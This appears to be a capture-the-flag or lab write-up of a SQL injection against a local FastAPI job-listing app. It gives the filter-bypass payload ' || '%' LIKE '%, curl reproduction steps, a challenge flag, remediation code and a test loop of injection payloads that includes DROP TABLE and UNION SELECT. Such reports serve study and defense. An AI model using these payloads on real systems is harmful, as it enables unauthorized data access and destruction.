# Security Assessment Report: SQL Injection with Allowlist Filter Bypass

## TL;DR
- **Objective**: Exploit SQL injection vulnerability protected by keyword allowlist filter
- **Outcome**: ACHIEVED - Successfully bypassed filter and extracted validation token
- **Highest-impact finding**: SQL injection in POST /jobs endpoint allowing access control bypass to view private/admin-only job records
- **Validation status**: CONFIRMED with token extraction
- **Validation token**: `FLAG{9c935b35ad7746d14fa2c01708b767f4cb0a9eaa867e77af44c14592439e53eb}`

## Target Information
- **Target**: 127.0.0.1:8000
- **Host / base URL**: http://127.0.0.1:8000
- **Application or component**: "Ultimate Job Aggregator" - FastAPI web application
- **Authentication context**: No authentication required for POST /jobs endpoint
- **Relevant technology details**:
  - FastAPI framework
  - SQLite or PostgreSQL backend (supports `||` concatenation/OR operator)
  - JSON-based API with POST /jobs endpoint
  - Keyword-based allowlist filter for SQL injection prevention

## Confirmed Vulnerability

### SQL Injection with Allowlist Filter Bypass
- **Affected endpoint / component**: POST /jobs (job_type parameter in JSON body)
- **Impact**: 
  - Complete bypass of access control enforcing private job visibility
  - Unauthorized access to sensitive data including administrative job listings
  - Data exfiltration of protected records containing validation flags
- **Preconditions**:
  - No authentication required
  - Target endpoint publicly accessible
  - Application uses keyword-based filtering instead of parameterized queries

- **Exact payload or PoC**:
```json
POST /jobs
Content-Type: application/json

{"job_type": "' || '%' LIKE '%"}
```

## Steps to Reproduce

1. **Identify access control enforcement**:
```bash
curl -X POST http://127.0.0.1:8000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "private"}'
```
Expected response: `HTTP/1.1 403 Forbidden`
```json
{"detail": "Only admins can see private jobs"}
```

2. **Test filter behavior with blocked keyword**:
```bash
curl -X POST http://127.0.0.1:8000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "' OR 1=1--"}'
```
Expected response: `HTTP/1.1 500 Internal Server Error` (keyword "OR" blocked by allowlist)

3. **Bypass filter using SQL concatenation operator**:
```bash
curl -X POST http://127.0.0.1:8000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "' || '%' LIKE '%"}'
```
Expected response: `HTTP/1.1 200 OK` with all jobs including private ones

4. **Extract flag from response**:
The response contains private job records with the validation token:
```
FLAG{9c935b35ad7746d14fa2c01708b767f4cb0a9eaa867e77af44c14592439e53eb}
```

## Validation / Evidence

- **Validation token / flag**: `FLAG{9c935b35ad7746d14fa2c01708b767f4cb0a9eaa867e77af44c14592439e53eb}`
- **Token source**: Extracted from private job records returned after SQL injection bypass

- **Tool evidence**:
  - Reconnaissance identified vulnerable endpoint POST /jobs with job_type parameter
  - FastAPI documentation at /docs confirmed JSON request body schema
  - Filter testing confirmed keyword "OR" blocked but operators allowed

- **Request evidence**:
```http
POST /jobs HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json

{"job_type": "' || '%' LIKE '%"}
```

- **Response evidence**:
```http
HTTP/1.1 200 OK
Content-Type: application/json

[All jobs returned including private jobs with FLAG{9c935b35ad7746d14fa2c01708b767f4cb0a9eaa867e77af44c14592439e53eb}]
```

- **Filter bypass technique**:
  - **Blocked**: `OR` keyword (returns 500 error)
  - **Allowed**: Single quotes (`'`), `||` operator, `LIKE` clause, `--` comments
  - **Bypass logic**: The `||` operator performs string concatenation in SQLite/PostgreSQL and can function as an OR operation when combined with LIKE clause
  - **Why it works**: The payload `' || '%' LIKE '%` breaks out of the SQL string literal, uses concatenation to create a tautology (`'%' LIKE '%'`), which evaluates to TRUE and returns all records

- **Notes on reliability / limitations**:
  - Exploitation requires no authentication
  - Works against SQLite and PostgreSQL backends
  - Access control completely bypassed at SQL query level
  - No rate limiting observed on vulnerable endpoint

## Remediation

- **Root cause**:
  1. Application uses string concatenation to build SQL queries instead of parameterized queries
  2. Allowlist filter only blocks specific keywords ("OR") but fails to block SQL operators and syntax
  3. Access control enforced at application logic level through SQL queries rather than separate authorization layer
  4. No input validation or sanitization beyond keyword filtering

- **Recommended fix**:
  1. **PRIMARY FIX**: Use parameterized queries (prepared statements) for all database operations:
     ```python
     # VULNERABLE CODE (example):
     query = f"SELECT * FROM jobs WHERE job_type = '{job_type}'"
     
     # SECURE CODE:
     query = "SELECT * FROM jobs WHERE job_type = ?"
     cursor.execute(query, (job_type,))
     ```
  
  2. **SECONDARY FIX**: Implement proper access control layer separate from data retrieval:
     ```python
     # Check authorization before query execution
     if job_type == "private" and not user.is_admin:
         raise HTTPException(status_code=403, detail="Only admins can see private jobs")
     
     # Then execute parameterized query
     query = "SELECT * FROM jobs WHERE job_type = ?"
     cursor.execute(query, (job_type,))
     ```
  
  3. **DEFENSE-IN-DEPTH**: Apply principle of least privilege - use database user accounts with restricted permissions

- **Defense-in-depth**:
  1. Web Application Firewall (WAF) with SQL injection detection rules
  2. Input validation whitelist for allowed job_type values (e.g., only "public", "private")
  3. Row-level security in database to enforce access control
  4. Security logging and monitoring for SQL injection attempts
  5. Regular security assessments and code reviews

## How to Verify the Fix

1. **Test parameterized query implementation**:
```bash
# Attempt SQL injection with various payloads
curl -X POST http://127.0.0.1:8000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "' || '\''%'\'' LIKE '\''%"}'
```
Expected secure result: No data returned or parameter treated as literal string value

2. **Verify access control enforcement**:
```bash
# Without admin credentials, attempt to access private jobs
curl -X POST http://127.0.0.1:8000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "private"}'
```
Expected secure result: `HTTP/1.1 403 Forbidden`

3. **Test with authenticated admin user**:
```bash
# With valid admin authentication
curl -X POST http://127.0.0.1:8000/jobs \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <admin_token>" \
  -d '{"job_type": "private"}'
```
Expected secure result: `HTTP/1.1 200 OK` with private jobs only for authorized admin

4. **Verify all injection payloads fail**:
```bash
# Test multiple injection techniques
payloads=("' OR 1=1--" "' || '%' LIKE '%" "'; DROP TABLE jobs--" "' UNION SELECT * FROM users--")
for payload in "${payloads[@]}"; do
  curl -X POST http://127.0.0.1:8000/jobs \
    -H "Content-Type: application/json" \
    -d "{\"job_type\": \"$payload\"}"
done
```
Expected secure result: All payloads either return 403 Forbidden or empty results (no data leakage)

## Remaining Leads

- **Confirmed blockers**: None - objective achieved
- **Unverified leads**:
  - Potential for other SQL injection points not yet discovered
  - Database user permissions and potential for privilege escalation
  - Other endpoints that may have similar vulnerabilities
  - Authentication system presence and potential weaknesses
- **Missing context**:
  - Full database schema and table relationships
  - User authentication mechanism details
  - Backend database type confirmation (SQLite vs PostgreSQL)
  - Full source code review for other SQL injection instances
